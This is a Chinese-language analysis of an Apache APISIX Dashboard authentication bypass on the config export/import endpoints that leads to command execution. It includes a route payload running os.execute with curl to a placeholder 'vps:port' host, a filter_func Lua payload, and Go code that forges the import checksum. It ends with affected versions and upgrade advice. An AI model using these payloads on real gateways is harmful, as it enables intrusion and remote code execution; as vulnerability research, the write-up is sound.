## 漏洞描述

 **Apache APISIX** 是一个动态、实时、高性能的 API 网关，
提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。你可以使用 Apache APISIX
来处理传统的南北向流量，以及服务间的东西向流量， 也可以当做 k8s ingress controller
来使用。攻击者可构造恶意请求，导入恶意配置，执行任意命令。

## 漏洞分析

后台的主要代码位于api/internal，先看到：api/internal/route.go首先注册了一系列handler：

![1641350758_61d50666619c9db822780.png!small?1641350758817](https://image.3001.net/images/20220105/1641350758_61d50666619c9db822780.png!small?1641350758817)

对应于api/internal/handler内的包。

因为是认证绕过，首先看一下项目的鉴权方面，其采用的是github.com/ShiningRush/droplet项目，位于api/cmd/root.go中添加了用户认证的filter：

![1641350794_61d5068a46b482c93856c.png!small?1641350794803](https://image.3001.net/images/20220105/1641350794_61d5068a46b482c93856c.png!small?1641350794803)

快进到api/internal/filter/authentication.go：

![1641350812_61d5069c1468bde469058.png!small?1641350812570](https://image.3001.net/images/20220105/1641350812_61d5069c1468bde469058.png!small?1641350812570)

会发现除了version和login页面外，凡是以/apisix为前缀的api都需要鉴权，而其呈现在代码中的形式就如api/internal/handler/service会有如下的呈现形式wgin.Wraps：

![1641350829_61d506adce69517e54db4.png!small?1641350830288](https://image.3001.net/images/20220105/1641350829_61d506adce69517e54db4.png!small?1641350830288)

根据流出的具有漏洞的url：`/apisix/admin/migrate/export`

![1641350850_61d506c2859190383de33.png!small?1641350850798](https://image.3001.net/images/20220105/1641350850_61d506c2859190383de33.png!small?1641350850798)

会发现这部分没有经过droplet的处理导致了认证绕过，好吧，原理很简单，通过export就可以导出配置文件了，下面看一下怎么进一步利用。

看了一圈发现也就只有这里的鉴权没有写好，因此漏洞点还是回到了这里，还有一处import，那么就想到是否是导入配置文件导致命令执行，根据网上流传的两个截图流出的关键点，一是filter_func，二是script。

filter_func的使用介绍可看：<https://apisix.apache.org/zh/docs/apisix/2.7/admin-api/>

> 用户自定义的过滤函数。可以使用它来实现特殊场景的匹配要求实现。该函数默认接受一个名为 vars 的输入参数，可以用它来获取 Nginx 变量。

script的使用介绍可看：<https://apisix.apache.org/zh/docs/apisix/architecture-design/script>

> 理论上，在`Script`中可以写任意 lua 代码，也可以直接调用已有插件以重用已有的代码。

实际上二者的利用原理都是处理路由时可无过滤执行任意lua代码。

本地创建一个路由随后添加上script，script处放入任意lua代码：

    
    
    {  
    "uris": [  
    "/test"  
    ],  
    "name": "test",  
    "methods": [  
    "GET",  
    "POST",  
    "PUT",  
    "DELETE",  
    "PATCH",  
    "HEAD",  
    "OPTIONS",  
    "CONNECT",  
    "TRACE"  
    ],  
    "script": "os.execute('curl vps:port')",  
    "script_id": "388133775432745673",  
    "upstream": {  
    "nodes": [],  
    "type": "roundrobin",  
    "scheme": "http"  
    },  
    "status": 1  
    }

filter_func的话代码需要放函数，for example:

    
    
    "filter_func":"function(vars) os.execute('ls>/tmp/success');return true end"

我们需要通过import导入，不过在导入之前需要计算checksum。

什么是checksum？我们在调用export导出时能看到如下最后的4个字符：

![1641350880_61d506e06a95dd9545b1a.png!small?1641350880876](https://image.3001.net/images/20220105/1641350880_61d506e06a95dd9545b1a.png!small?1641350880876)

这四个就是checksum，对应的计算方式在项目代码中也有呈现，因此直接抓出来就可以用了。

    
    
    package main  
    ​  
    import (  
    "encoding/binary"  
    "hash/crc32"  
    "io/ioutil"  
    "os"  
    )  
    ​  
    const (  
    exportFileName = "apisix-config.bak"  
    checksumLength = 4 // 4 bytes (uint32)  
    )  
    func main() {  
    data := []byte(`<data>`)  
    checksumUint32 := crc32.ChecksumIEEE(data)  
    checksum := make([]byte, checksumLength)  
    binary.BigEndian.PutUint32(checksum, checksumUint32)  
    fileBytes := append(data, checksum...)  
    content := fileBytes  
    ioutil.WriteFile("poc",content,os.ModePerm)  
    }

生成的poc就是我们需要覆盖的配置文件，此时我们先把路由删除，模拟在只有认证绕过的情况下的场景。

先不谈怎么利用，继续分析，回看到import路由，需求参数有mode和file：

![1641350906_61d506fad8ca858ffd956.png!small?1641350907191](https://image.3001.net/images/20220105/1641350906_61d506fad8ca858ffd956.png!small?1641350907191)

file自不必说，看一下mode：

    
    
    return\overwrite\skip

很显然overwrite就是重写配置文件了，因此post一下前面计算完checksum得到的poc以及mode=overwrite，随后访问apisix的/test即可成功验证漏洞。

## 影响版本及修复建议

影响版本:2.7-2.10

修复建议:升级至最新安全版本 Apache APISIX Dashboard
2.10.1：<https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1>

